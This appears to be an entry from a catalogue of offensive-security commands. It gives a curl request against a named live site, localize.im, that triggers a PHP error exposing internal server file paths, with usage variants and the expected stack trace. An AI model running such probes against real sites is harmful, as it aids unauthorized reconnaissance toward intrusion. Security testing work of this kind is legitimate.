---
data: 'curl "https://www.localize.im/projects/3t/languages/4xX" -v'
tags:
  - reconnaissance
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.139Z'
id: ab37c06b-5bf9-4cff-a2eb-53cb73b0c44c
verified: false
validated: true
submitted: true
---
# curl-access-invalid-language-url

## Command

```bash
curl "https://www.localize.im/projects/3t/languages/4xX" -v
```

## Description

This command uses curl to send a GET request to a malformed URL in the Localize application, triggering a PHP exception that discloses internal server file paths. It is used for reconnaissance in web vulnerability testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"https://www.localize.im/projects/3t/languages/4xX"` | The target URL with invalid language ID | Yes |
| `-v` | Verbose mode to show detailed request/response | No |

## Examples

### Basic Usage

```bash
curl "https://www.localize.im/projects/3t/languages/4xX"
```

### Advanced Usage

```bash
curl "https://www.localize.im/projects/3t/languages/4xX" -v -o response.html
```

> Saves the output to a file for analysis.

## Expected Output

A 500 error response with PHP stack trace, e.g., "Fatal error: Uncaught exception 'Exception' ... in /srv/data/web/vhosts/www.localize.im/htdocs/classes/Language.php on line 123". Includes full server paths in the error details.

## Related

- [[Related Procedure: Trigger Full Path Disclosure via Invalid Language ID]]
